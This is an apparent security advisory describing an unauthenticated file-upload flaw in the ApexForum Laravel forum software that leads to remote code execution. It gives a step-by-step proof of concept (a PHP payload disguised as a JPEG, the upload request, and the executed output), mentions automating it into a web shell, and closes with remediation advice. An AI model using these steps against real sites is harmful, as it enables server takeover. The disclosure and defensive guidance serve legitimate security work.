# 📤 ApexForum - Arbitrary File Upload to Remote Code Execution (RCE)

📌 **Product Information**  
**Platform**: Laravel  
**Affected Feature**: File Upload Endpoint  
**Tested Vulnerability**: Unrestricted File Upload (PHP Code Execution)  
**CVE**: Not Assigned  
**Severity**: Critical (Unauthenticated File Upload to RCE)  
**CWE ID**: CWE-434  
**CWE Name**: Unrestricted Upload of File with Dangerous Type  
**Patched**: ❌ Not Applicable  
**Patch Priority**: 🔴 High  
**Date Published**: August 10, 2025  
**Researcher**: Yucaerin  
**Vendor**: [ApexForum](https://www.codester.com/items/46152/apexforum-the-ultimate-forum-platform)

---

⚠️ **Summary of the Vulnerability**  
The `upload` endpoint in ApexForum's Laravel application fails to properly validate uploaded files. Attackers can upload arbitrary files with embedded PHP code by disguising them as images, which the server stores in a publicly accessible directory.  
When accessed, the uploaded PHP file executes on the server, resulting in **Remote Code Execution (RCE)**.

---

## 🧪 Proof of Concept (PoC)  

### ➤ Step 1 - Craft Malicious Image with Embedded PHP
Example payload (`bq.jpg`):
```php
ÿØÿà<?php echo 'hello world'; ?>
```

### ➤ Step 2 - Upload via Vulnerable Endpoint
```http

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="image"; filename="bq.jpg"
Content-Type: image/jpeg

ÿØÿà<?php echo 'hello world'; ?>
------WebKitFormBoundary--
```

**Response:**
```json
{
  "status":200,
  "url":"https:\/\/localhost\/public\/uploads\/trumbowyg\/20fd17f01763a1130306e93ee0015250.php"
}
```

---

### ➤ Step 3 - Trigger the Payload
Access:
```
https://localhost/public/uploads/trumbowyg/20fd17f01763a1130306e93ee0015250.php
```
**Output:**
```
hello world
```

✅ **Indicators of Success**:
- Server accepts `.php` files.
- Payload is executed upon visiting the file URL.
- Full RCE is possible.

---

## 🔍 Where’s the Flaw?
- No server-side MIME type or extension validation.
- No file content scanning to detect embedded PHP.
- Upload directory is publicly accessible and executes `.php` files.

---

## 🔐 Recommendation
- Restrict allowed file types/extensions server-side (e.g., `.jpg`, `.png`, `.gif` only).
- Validate MIME type and file signature (magic bytes).
- Store uploads outside the web root or serve them via a non-executable handler.
- Configure web server to prevent execution of scripts in the upload directory.
- Sanitize file names and paths.

---

## ⚙️ Optional Automation Features
An automated exploit could:
- Craft a PHP web shell disguised as an image.
- Access the uploaded file to execute commands remotely.

---

## ⚠️ Disclaimer  
This PoC is for **educational and authorized security testing** only.  
Do **not** target systems without explicit permission. Unauthorized exploitation is illegal.
